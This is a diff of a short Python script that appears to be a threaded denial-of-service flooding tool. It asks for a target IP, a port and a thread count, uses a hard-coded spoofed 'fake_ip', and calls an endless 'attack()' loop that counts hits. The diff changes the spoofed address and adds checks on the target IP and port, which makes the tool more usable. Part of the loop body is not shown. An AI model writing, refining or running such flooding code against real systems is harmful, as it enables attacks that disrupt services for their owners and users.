@@ -1,11 +1,22 @@
 import socket
 import threading
 import os
+import ipaddress
 
 target = str(input("Insert target’s IP: "))
 port = int(input("Insert Port: "))
 Trd = int(input("Insert number of Threads: "))
-fake_ip = '44.197.175.168'
+fake_ip = '44.192.193.194'
+
+try:
+    target_ip = ipaddress.ip_address(target)
+except ValueError:
+    print("Invalid IP address!")
+    exit()
+
+if not (0 < port < 65536):
+    print("Invalid port number!")
+    exit()
 
 def attack():
  while True:
@@ -22,3 +33,5 @@ def attack():
 global attack_num
  attack_num += 1
  print(attack_num)
+
+
